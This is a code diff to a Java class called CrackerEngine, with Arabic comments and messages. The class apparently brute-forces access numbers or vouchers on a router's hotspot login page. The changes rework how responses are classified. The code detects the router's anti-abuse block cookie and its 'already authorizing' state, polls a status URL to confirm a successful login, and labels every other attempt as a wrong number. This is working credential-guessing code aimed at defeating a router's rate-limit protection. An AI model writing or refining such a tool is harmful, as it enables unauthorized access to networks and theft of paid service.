@@ -278,14 +278,6 @@ public class CrackerEngine {
 
             int code = c.getResponseCode();
             extractCookies(c, cookies);
-            
-            // فحص الحظر الحقيقي عبر الكوكيز (حسب hotBlocker.js)
-            if (cookies.containsKey("hot_blocker_blocked_time")) {
-                Result rb = Result.busy("محظور");
-                rb.responseText = "الراوتر حظرك (كوكي الحظر موجود). انتظر قليلاً.";
-                return rb;
-            }
-            
             String body = "";
             try {
                 InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
@@ -295,43 +287,20 @@ public class CrackerEngine {
 
             if (stopped.get()) return Result.bad("stopped");
 
-            String redirectUrl = extractRedirectUrl(body);
-            if (redirectUrl != null) {
-                try {
-                    String fullUrl = redirectUrl.startsWith("http") ? redirectUrl : baseUrl + "/" + redirectUrl.replaceAll("^/", "");
-                    HttpURLConnection c5 = (HttpURLConnection) new URL(fullUrl).openConnection();
-                    c5.setConnectTimeout(4000); c5.setReadTimeout(4000);
-                    c5.setRequestProperty("User-Agent", ua);
-                    String ck3 = cookiesStr(cookies);
-                    if (!ck3.isEmpty()) c5.setRequestProperty("Cookie", ck3);
-                    String newBody = read(c5.getInputStream());
-                    c5.disconnect();
-                    body = newBody;
-                } catch (Exception e) {}
-            }
-            
             String low = body.toLowerCase();
-            
-            // [1] اكتشاف الحظر (حسب الكود الحقيقي للشبكة)
-            // [تم حذف شرط الحظر الوهمي لأن id="block" موجود دائماً في الصفحة]
-            
-            // [2] اكتشاف الرقم الخاطئ (الراوتر يعيدك للصفحة الرئيسية)
-            if (body.contains("window.location.href=\"index.html\"") || body.contains("window.location.href=\'index.html\'")) {
-                Result rb = Result.bad("رقم خاطئ");
-                rb.responseText = "الراوتر رفض الرقم (خاطئ أو منتهي)";
+            if (body.contains("already authorizing") || low.contains("already authorizing")) {
+                Result rb = Result.busy("authorizing");
+                rb.responseText = "الراوتر مشغول";
                 return rb;
             }
             
-            // [3] استخراج النص العادي كخطة بديلة
-            String respClean = body.replaceAll("<[^>]+>", " ").replaceAll("\s+", " ").trim();
-            if (respClean.length() > 100) respClean = respClean.substring(0, 100) + "...";
-            if (body.contains("already authorizing") || low.contains("already authorizing")) {
-                Result rb = Result.busy("already authorizing");
-                rb.responseText = respClean;
+            if (cookies.containsKey("hot_blocker_blocked_time")) {
+                Result rb = Result.busy("محظور");
+                rb.responseText = "الراوتر حظرك مؤقتاً";
                 return rb;
             }
 
-            // 🔥 السر: فحص الحالة أولاً قبل الحكم على الرقم!
+            // تجاهل صفحة الرد تماماً، وافحص الحالة مباشرة
             sleep(80);
             HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
             c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
@@ -350,20 +319,10 @@ public class CrackerEngine {
                 }
             } catch (Exception e) {}
 
-            // إذا وصلنا هنا، الراوتر لم يسجل الدخول. الآن نفحص لو كان الرد يحتوي على خطأ
-            if (low.contains("invalid") || low.contains("error") 
-                || low.contains("wrong") || low.contains("denied")
-                || low.contains("expired") || low.contains("منتهي") 
-                || low.contains("غير صحيحة") || low.contains("غير صحيح")
-                || low.contains("انتهت") || low.contains("خطأ")) {
-                Result rb = Result.bad("خاطئ");
-                rb.responseText = respClean;
-                return rb;
-            }
-            
-            Result rb = Result.bad(null);
-            rb.responseText = respClean;
+            Result rb = Result.bad("رقم خاطئ");
+            rb.responseText = "الراوتر رفض الرقم";
             return rb;
+
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
